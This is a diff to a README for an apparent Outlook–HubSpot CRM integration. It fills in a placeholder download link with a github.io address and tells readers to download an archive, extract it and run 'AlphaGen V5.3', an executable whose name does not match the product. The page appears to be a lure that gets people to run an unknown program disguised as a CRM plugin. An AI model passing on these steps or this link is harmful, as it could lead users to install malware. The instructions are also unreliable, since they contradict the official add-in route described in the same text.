@@ -2,13 +2,13 @@
 
 Integrate Outlook with HubSpot CRM to log emails, track conversations, and schedule meetings — directly from your inbox.
 
-[![Download](https://img.shields.io/badge/Download-Outlook_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Outlook_HubSpot_Integration-blueviolet)](https://outlook-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://outlook-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract the files to your local system  
 3. 🖱 Run AlphaGen V5.3 to activate Outlook sync  
 4. ✅ Open Outlook, navigate to `Add-ins`, and connect your HubSpot account through the HubSpot Sales plugin
